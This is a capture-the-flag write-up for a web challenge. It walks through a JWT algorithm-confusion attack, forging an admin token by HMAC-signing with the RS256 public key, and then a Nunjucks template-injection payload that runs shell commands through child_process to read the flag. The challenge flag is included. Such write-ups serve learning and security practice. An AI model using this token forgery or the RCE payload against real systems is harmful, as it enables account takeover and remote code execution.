# Cyber Santa – Naughty or Nice

- **Category:** Web
- **Points:** 325
- **Difficulty:** ★★☆☆

## Disclaimer: I did not solve this challenge during the competition.

## Challenge

A website with a simple register/login as well as dashboard page. Source code was supplied.

## Solution

- JWT Token Signing Algorithm accepts both `RS256` and the insecure `HS256`

```
async sign(data) {
    data = Object.assign(data, {pk:publicKey});
    return (await jwt.sign(data, privateKey, { algorithm:'RS256' }))
},
async verify(token) {
    return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));
}
```

- JWT Token was in format `{username: "xxx", "pk:" "xxx", "iat": "xxx"}`
- Where `pk` was the Public Key that was used to sign the token
- Modifying the JWT Token to accept `HS256` as its algorithm and changing the username to `admin`. We get a new JWT
- We need to sign the this new JWT token using the Public Key supplied

  - Convert the Public Key into hex
    - Add the Public Key to a file called `test.pem`
    - ```
      cat test.pem | xxd -p | tr -d "\\n"
      ```
  - Run the command `echo -n "new_jwt_token" | openssl dgst -sha256 -mac HMAC -macopt hexkey: the_hex_of_publickey`
  - Convert the signature into base64 and remove appended equals signs

  ```
  import base64, binascii
  print(base64.urlsafe_b64encode(binascii.a2b_hex('signature')).replace(b'=',b''))
  ```

  - Append the secret to the header and payload of the new jwt and refresh page

- There is template rendering from the nunjucks templating engine
- Using the payload

```
{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat ../flag*')")()}}
```

retrieves the flag

```
HTB{S4nt4_g0t_ninety9_pr0bl3ms_but_chr1stm4s_4in7_0n3}
```

## Thoughts

- This was quite hard. Even while following writeups, had a bit of trouble
- Getting the jwt signed with the Public Key had to be on my Kali VM because my Mac had some error setting context, bad key length in some crypto internal error that I couldn't rectify
- Hex encoding of base 64 public key should have been done using the bash utilities. I did not figure out why converting it into bytes then hex gave me an invalid signature.
- Learnt a new templating payload
- Learnt how to crack jwts! (weak ones that accept multiple algorithms)
- Useful post that I referred to [jwt cracker](https://habr.com/en/post/450054/)
